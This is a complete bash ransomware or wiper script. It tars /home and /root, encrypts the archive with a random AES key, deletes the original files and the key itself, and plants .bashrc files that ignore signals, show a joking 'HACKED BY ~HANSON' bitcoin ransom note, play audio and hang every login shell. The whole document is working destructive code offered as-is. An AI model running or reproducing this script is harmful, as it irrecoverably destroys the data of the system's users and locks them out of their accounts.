#!/bin/bash

generate_bashrc() {
cat << EOF > $1
trap '' 1 2 3 15 20

echo '#####################################################################'
echo '#                         HACKED BY ~HANSON                         #'
echo '#                  ALL YOUR BASE ARE BELONG TO US                   #'
echo '#####################################################################'
echo 
echo 'ALL YOUR FILES WERE COMPRESSED, ENCRYPTED, AND STORED AT /ROOT'
echo 'FOR INFO ON HOW TO GET YOUR FILES BACK, CONNECT ON IRC CHANNEL BELOW'
echo 'AFTER TRANSFERING 1000 BITCOINS TO cd0340a2214058390d204a826de05312'
echo 'IRC: 127.0.0.1'
echo

aplay -q -N /tmp/data/mmmbop.wav >/dev/null 2>/dev/null &

while true
do
	sleep 1
done
EOF
}

cd /root

tar cf file.tar /home/ /root/

openssl rand -base64 32 > key.bin
openssl enc -aes-256-cbc -salt -in file.tar -out file.enc -pass file:./key.bin

find . -type d -exec rm -rf {} +
find . ! -name 'file.enc' -type f -exec rm -f {} +

generate_bashrc .bashrc

cd /home

for directory in $(find . -type d -not -path .)
do
	rm -rf "$directory"/*
	generate_bashrc $directory/.bashrc
done
